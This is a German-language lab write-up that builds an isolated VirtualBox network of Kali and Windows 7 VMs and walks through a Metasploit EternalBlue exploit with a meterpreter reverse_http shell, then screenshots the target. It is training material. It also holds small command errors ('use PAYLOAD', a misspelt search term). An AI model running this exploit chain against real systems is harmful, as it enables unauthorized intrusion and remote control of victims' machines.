# Labor 4

## 1. internes Netzwerk aufsetzen
__VirtualBox__:

`Tools > Network > NAT Networks > Create`

    - Name: vboxnet
    - IPv4 Prefix: 192.168.100.0/24
    - DHCP-Server deaktivieren

## 2. VMs aufsetzen
__VirtualBox__:

`New > follow the installation instructions`

    - User: zepi
    - Password: 123

in den Settings der VMs das Netzwerk auf das erstellte interne NAT Network setzen

## 3. Manuelle IP-Zuweisung
__Kali__: 

_während der Installation_

oder 

`StatusBar > Internet (right click) > Edit Connections...`

__Windows 7:__

`Netzwerk und Freigabecenter öffnen > LAN-Verbindung > Eigenschaften > Internetprotokoll Version 4 (TCP/IPv4)`

_Firewall deaktivieren_


__Verbindung Testen__

Win > Kali 
```powershell
ping 192.168.100.10
```
Kali > Win
```bash
ping 192.168.100.20
```

## 'eternalblue'-Exploit mit 'reverse_http'-Payload
__Kali__
```bash
msfconsole
```

```bash
search etrnalblue
use exploit/windows/smb/ms17_010_eternalblue
use PAYLOAD payload/windows/x64/meterpreter/reverse_http
set -g RHOSTS 192.168.100.20
set -g LHOST 192.168.100.10
exploit
```

Durch `-g` wird der Wert global gesetzt und muss nicht erneut gesetzt werden.

Exploit ausprobieren:
```bash
sysinfo
```

```bash
screenshot
```

Mit `exit` kann die shell wieder verlassen werden.
